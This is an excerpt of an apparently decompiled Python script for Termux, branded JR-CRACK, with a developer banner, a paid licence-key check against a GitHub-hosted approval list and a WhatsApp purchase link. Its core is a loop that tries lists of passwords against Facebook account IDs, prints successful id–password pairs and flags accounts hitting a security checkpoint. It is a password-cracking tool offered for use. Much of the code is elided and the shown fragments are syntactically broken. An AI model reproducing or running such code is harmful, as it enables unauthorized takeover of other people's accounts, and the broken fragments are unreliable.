#DECODED BY : Md.JULFIKAR RAYIM
#GITHUB : https://github.com/Julfikar404
#--------------------------------------------------------------------------#
#
#-----------------[ IMPORT-MODULE ]-------------------
...
try:
	...
	kok.write(myid+rayim)
	kok.close()
def Subscraption():
	key1=open('/data/data/com.termux/files/usr/bin/python2-confi1', 'r').read()
	os.system('clear')
	banner()
	r1=requests.get("https://raw.githubusercontent.com/Julfikar404/FAST/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		banner()
		menu()
		...
		print ("")
		print (" \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m Your Key : "+rayim+key1)
		print ("")
		...
		os.system('am start https://wa.me/+8801770108796?text=' + tks) 
		#Subscraption()
...
def banner():
	print(f"""
           ...
           \33[1;31m   ____  _____  ________  ___
           \33[1;32m  / __ \/   \ \/ /  _/  |/  /
          \33[1;33m  / /_/ / /| |\  // // /|_/ /
           \33[1;34m/ _, _/ ___ |/ // // /  / /
          \33[1;35m/_/ |_/_/  |_/_/___/_/  /_/
             
\x1b[38;5;46m______________________________________________________

 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m DEVELOPER : 🔥JULFIKAR RAYIM🔥
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m FACEBOOK  :   Md.JULFIKAR RAYIM
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m GITHUB    :   Julfikar404
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m TOOLS     :   JR-CRACK
...
#banner()
#file()
#print(f'\033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m WHAT IS YOUR NAME(🔥JULFIKAR🔥:')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#print ()
				print(f'\r\r\x1b[38;5;46m[JULFIKAR-RAYIM-OK💉] '+idf+ ' | '+pw+'')
